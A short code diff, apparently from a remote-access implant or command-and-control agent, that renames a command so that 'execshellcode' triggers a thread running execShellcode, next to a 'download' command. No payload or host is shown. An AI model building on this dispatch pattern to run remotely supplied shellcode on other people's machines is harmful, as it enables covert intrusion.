@@ -195,7 +195,7 @@ def checkJobs():
 			#This is where we define our commands
 			commandsList = commands.split()
 
-			if commandsList[0] == 'execshell': 
+			if commandsList[0] == 'execshellcode': 
 				t = threading.Thread(name='execshell', target=execShellcode, args=(commandsList[1],))
 			elif commandsList[0] == 'download':
 				t = threading.Thread(name='download', target=download, args=(commandsList[1],))
